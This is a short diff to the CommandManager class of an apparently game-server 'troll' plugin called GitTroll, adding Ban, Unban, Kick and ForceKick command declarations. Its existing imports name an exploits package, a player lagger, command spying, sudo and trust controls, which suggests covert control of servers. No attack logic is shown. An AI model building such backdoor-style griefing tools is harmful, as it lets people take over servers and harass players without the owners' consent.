@@ -26,17 +26,21 @@ import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerLagger;
 import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerList;
 import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeRedirect;
 import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
+import net.Lenni0451.GitTroll.command.commands.player.Ban;
 import net.Lenni0451.GitTroll.command.commands.player.CommandSpy;
 import net.Lenni0451.GitTroll.command.commands.player.Control;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
+import net.Lenni0451.GitTroll.command.commands.player.ForceKick;
 import net.Lenni0451.GitTroll.command.commands.player.Freeze;
 import net.Lenni0451.GitTroll.command.commands.player.Gamemode;
 import net.Lenni0451.GitTroll.command.commands.player.Godmode;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
+import net.Lenni0451.GitTroll.command.commands.player.Kick;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
 import net.Lenni0451.GitTroll.command.commands.player.Sudo;
 import net.Lenni0451.GitTroll.command.commands.player.Title;
 import net.Lenni0451.GitTroll.command.commands.player.Trust;
+import net.Lenni0451.GitTroll.command.commands.player.Unban;
 import net.Lenni0451.GitTroll.command.commands.player.UnhookPacketListener;
 import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
@@ -119,6 +123,10 @@ public class CommandManager implements Listener {
 	public final Control Control = null;
 	public final WorldManager WorldManager = null;
 	public final Godmode Godmode = null;
+	public final Ban Ban = null;
+	public final Unban Unban = null;
+	public final Kick Kick = null;
+	public final ForceKick ForceKick = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
